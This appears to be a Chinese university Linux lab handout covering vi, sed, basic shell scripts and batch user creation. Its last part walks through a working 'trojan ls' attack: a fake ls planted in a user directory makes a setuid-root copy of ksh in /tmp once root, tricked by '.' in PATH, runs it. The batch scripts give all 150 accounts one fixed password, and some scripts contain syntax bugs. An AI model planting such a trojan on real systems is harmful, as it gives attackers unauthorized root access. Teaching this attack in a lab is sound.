@@ -1,0 +1,289 @@
+实验题目：linux脚本编程1
+实验要求：
+一. vi编辑器的使用
+二. 按照附件给出的脚本，逐个完成编辑、执行，了解其原理。并做适当修改（要求尽可能每个脚本中用echo命令加入自己的学号姓名等信息，以便排除抄袭嫌疑）. 将每个修改过的脚本的编辑截图及执行截图放在word文档中，命名为学号+班号，上传至乐学网。
+三. 如果上次实验最后的木马ls程序没能完成，请补充完成。具体步骤见本实验须知的最后。
+四. 最后，请确认批量生成用户的程序及木马程序能在你的机器上有效运行，并等待助教检查通过。
+五. 其余时间可以练习ppt上的其他命令，或者自由上机。
+
+
+具体步骤：
+
+一.vi编辑器的使用
+
+1).  使用vi打开一个新文档，并输入以下两行内容：
+Linux is an operating system that was initially created as a hobby by a young student, Linus Torvalds, at the University of Helsinki in Finland. Linus had an interest in Minix, a small UNIX system, and decided to develop a system that exceeded the Minix standards. 
+The kernel, at the heart of all Linux systems, is developed and released under the GNU General Public License and its source code is freely available to everyone. It is this kernel that forms the base around which a Linux operating system is developed. 
+
+2)、发出命令显示行号。
+：set nu
+3)、保存到文件AboutLinux，不退出。
+：w AboutLinux
+
+保存命令
+
+按ESC键 跳到命令模式，然后：
+
+:w   保存文件但不退出vi
+:w file 将修改另外保存到file中，不退出vi
+:w!   强制保存，不推出vi
+:wq  保存文件并退出vi
+:wq! 强制保存文件，并退出vi
+q:  不保存文件，退出vi
+:q! 不保存文件，强制退出vi
+:e! 放弃所有修改，从上次保存文件开始再编辑
+4)、删除一句“It is this kernel that forms the base around which a Linux operating system is developed.”。
+
+5)、查找单词“Finland”。
+命令模式下输入
+/单词     正向查找单词
+?单词    反向查找单词
+
+6)、把第一行的“Finland”后的内容变成独立的一行。现在共有三行内容。
+
+7)、复制第二行的内容到文档的最后。
+yy:复制光标所在行
+p：粘贴复制的内容到光标所在行
+
+8)、删除第三行的内容。
+x, 删除光标所在字符
+dw, 删除光标所在单词
+dd, 删除当前行
+n dd：删除当前光标所在行开始的n行
+
+9)、恢复被删除的一行内容。
+u：取消当前已个动作
+
+10)、查找所有的“Minix”并全部改为“MINIX”。
+sed 实用工具以及其它任何类似的编辑器的最常用的命令之一是用一个值替换另一个值。用来实现这一目的的操作的命令部分语法是： 
+'s/{old value}/{new value}/' 
+因而，下面演示了如何非常简单地将 "tiger" 修改为 "wolf"： 
+$ echo The tiger cubs will meet on Tuesday after school | sed 's/tiger/wolf/' 
+The wolf cubs will meet on Tuesday after school 
+
+全局修改 
+让我们开始一次看似简单的编辑。假定在要修改的消息中出现了多次要修改的项目。默认方式下，结果可能和预期的有所不同，如下所示： 
+$ echo The tiger cubs will meet this Tuesday at the same time 
+as the meeting last Tuesday | sed 's/Tuesday/Thursday/' 
+The tiger cubs will meet this Thursday at the same time 
+as the meeting last Tuesday 
+$ 
+与 将出现的每个 "Tuesday" 修改为 "Thursday" 相反，sed 编辑器在找到一个要修改的项目并作了修改之后继续处理下一行，而不读整行。sed 命令功能大体上类似于替换命令，这意味着它们都处理每一行中出现的第一个选定序列。为了替换出现的每一个项目，在同一行中出现多个要替换的项目的情况下， 您必须指定在全局进行该操作： 
+$ echo The tiger cubs will meet this Tuesday at the same time 
+as the meeting last Tuesday | sed 's/Tuesday/Thursday/g' 
+The tiger cubs will meet this Thursday at the same time 
+as the meeting last Thursday 
+$ 
+
+文档内修改：
+:%s/Minix/MINIX /g(%:所有行  g:所有替换)
+
+11)、不保存并退出vi。
+q!：exit vi edit(对修改不做保存)
+
+12)、使用vi再次打开文件AboutLinux。应该显示原来的两行内容。
+
+13)、在第二行后插入一行“He began his work in 1991 when he released version 0.02 and worked steadily until 1994 when version 1.0 of the Linux Kernel was released.”。
+
+14)、 在文档的最后增加一行“There are now literally hundreds of companies and organizations and an equal number of individuals that have released their own versions of operating systems based on the Linux kernel.”。
+
+15)、保存并退出vi。
+
+16)、设置文件AboutLinux的权限为400（“r--------”）。
+
+chmod 400 AboutLinux
+
+17)、使用vi再次打开文件AboutLinux，并在文档最后增加一行“More information on the kernel can be found at our sister site, LinuxHQ and at the official Linux Kernel Archives.”。并保存文档后退出。
+
+
+二、 脚本编程：完成如下脚本的编程，并在每个脚本的适当位置加入如下一条语句：
+ echo "my student number is ：***， my name is...****"
+将每个脚本的vi编辑界面及运行界面分别截图，保存为doc格式，命名为学号+姓名.DOC, 上传至乐学网。
+
+
+1. 利用vi 建立一个脚本文件,其中包括date、cal、pwd、ls等常用命令。然后以不同方式执行该脚本.
+vi script
+(date
+cal
+pwd
+ls)
+
+(方式1)	#bash < script
+(方式2)	#chmod a+x script
+#PATH=$PATH:.
+#script
+
+
+2.  编写一个shell脚本,它把第二个位置参数及其以后的各个参数指定的文件复制到第一个位置参数指定的目录中.
+#!/bin/bash
+path="."
+for x in $@
+do
+path=$x
+break
+done
+
+echo "Copying..."
+shift
+
+for x in $@
+do
+cp $x $path
+done
+
+echo "done"
+
+例如：将上面文件保存为copy.sh, 然后在shell提示符下输入copy.sh /root /etc/passwd
+
+3. 打印给定目录下的某些文件,由第一个参数指出文件所在的目录,其余参数是要打印的文件名.
+#!/bin/bash
+for x in $@
+do
+cd $x
+path=$x
+break
+done
+
+echo”Copying…”
+shift
+
+for f in $@
+do
+cat $f
+done
+例如：将上述文件保存为a.sh 然后在shell提示符下输入a.sh /etc passwd
+
+4 批量生成用户
+
+   1）利用下面所附的自动生成用户清单的脚本生成用户清单，并自行编制生成用户密码清单程序；
+   2）执行上述两个程序，生成两个清单；
+   3）然后按照下述步骤完成批量用户的创建。
+
+     添加和删除用户对每位Linux系统管理员都是轻而易举的事，比较棘手的是如果要添加几十个、上百个甚至上千个用户时，我们不太可能还使用 useradd一个一个地添加，必然要找一种简便的创建大量用户的方法。Linux系统提供了创建大量用户的工具，可以让您立即创建大量用户，方法如下：
+（1）先编辑一个文本用户文件，每一列按照/etc/passwd密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：
+　　user001::600:100:user:/home/user001:/bin/bash
+　　user002::601:100:user:/home/user002:/bin/bash
+　　user003::602:100:user:/home/user003:/bin/bash
+（2）以root身份执行命令/usr/sbin/newusers，从刚创建的用户文件user.txt中导入数据，创建用户：
+        # newusers < user.txt
+      　然后可以执行命令vi /etc/passwd检查/etc/passwd文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。
+（3）执行命令/usr/sbin/pwunconv，将/etc/shadow产生的shadow密码解码，然后回写到/etc/passwd中，并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消shadow password功能。
+　　# pwunconv
+（4）编辑每个用户的密码对照文件，范例文件passwd.txt内容如下：
+　　user001:密码
+　　user002:密码
+　　user003:密码
+?（5）以root身份执行命令/usr/sbin/chpasswd，创建用户密码，chpasswd会将经过/usr/bin/passwd命令编码过的密码写入/etc/passwd的密码栏。
+　　# chpasswd < passwd.txt
+（6）确定密码经编码写入/etc/passwd的密码栏后，执行命令/usr/sbin/pwconv
+将密码编码为shadow password，并将结果写入/etc/shadow。
+　　# pwconv
+　　这样就完成了大量用户的创建了，之后您可以到/home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。
+
+附：生成用户清单的脚本。
+
+#!/bin/bash
+#生成用户列表
+COUNTER=1
+ID=701
+while [  ! $COUNTER -gt 150 ]
+do
+   if [  $COUNTER -lt 10 ]
+   then
+      echo "stu00$COUNTER::$ID:$ID::/home/stu00$COUNTER:/bin/bash"
+   else
+      if [  $COUNTER -lt 100 ]
+      then
+         echo "stu0$COUNTER::$ID:$ID::/home/stu0$COUNTER:/bin/bash"
+      else
+         echo "stu$COUNTER::$ID:$ID::/home/stu$COUNTER:/bin/bash"
+      fi
+   fi
+   COUNTER=$[COUNTER+1]
+   ID=$[ID+1]
+Done
+
+附：生成密码的脚本。
+#!/bin/bash
+#生成密码列表
+COUNTER=1
+ID=701
+
+while [ ! $COUNTER -gt 150 ]
+do
+   if [ $COUNTER -lt 10 ]
+   then
+      echo "stu00$COUNTER:a0b0c0d0"
+   else
+      if [$COUNTER -lt 100 ]
+      then
+         echo "stu0$COUNTER:a0b0c0d0"
+      else
+         echo "stu$COUNTER:a0b0c0d0"
+      fi
+   fi
+   COUNTER=$[COUNTER+1]
+   ID=$[ID+1]
+done
+
+木马ls程序的具体实施步骤为：
+
+step 1: 以一般用户身份开一个终端窗口1.
+
+本例假设该用户名为hacker。如果以root登录，可以执行如下命令：
+
+#useradd hacker
+
+#su hacker
+
+$
+
+step 2：（在hacker用户的目录下编辑一个木马文件，如下所示。)
+
+$cd /home/hacker
+
+$vi ls
+
+#!/usr/bin/ksh
+
+cp /usr/bin/ksh  /tmp/.hacker
+
+chown root /tmp/.hacker
+
+chmod u+s /tmp/.hacker
+
+rm -f $0
+
+/bin/ls $*
+
+$chmod a+x ls
+
+step 3：（创建一个名字怪异的文件，目的是请求root用户来删除该文件)
+
+$cd /home/hacker
+
+$cat > -i
+
+balabala<ctrl -d>
+
+step 4 ：
+
+首先以root身份再开一个终端窗口2.
+
+然后修改PATH变量：
+
+#PATH=.:$PATH
+
+#cd /home/hacker
+
+ls
+
+-i
+
+step 5: 在终端窗口1上，执行如下命令，从而获得超级用户权限。
+
+$cd /tmp
+
+$.hacker
+
+#
